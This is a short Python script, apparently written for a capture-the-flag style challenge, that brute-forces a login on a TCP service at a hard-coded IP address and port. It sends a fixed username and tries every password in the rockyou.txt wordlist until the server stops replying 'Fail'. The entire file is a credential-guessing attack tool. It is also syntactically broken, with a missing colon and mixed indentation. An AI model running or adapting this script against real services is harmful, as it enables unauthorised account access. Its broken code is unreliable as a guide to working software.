import socket

host = "142.93.117.192" # IP address here
port = 1337 # Port here
wordlist = "rockyou.txt"
username = "kreugster"
def brute_force():

    list = open(wordlist, "r")
    for line in list
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((host, port))

        data = s.recv(1024)      

        s.send(username + '\n')
        data = s.recv(1024) 
	print(data)

        s.send(line)
	print('trying:' + line)
        data = s.recv(1024)
	print('result' + data)

        if data != "Fail\n":
            print('password is' + line)
            quit()
        


if __name__ == '__main__':
    brute_force()
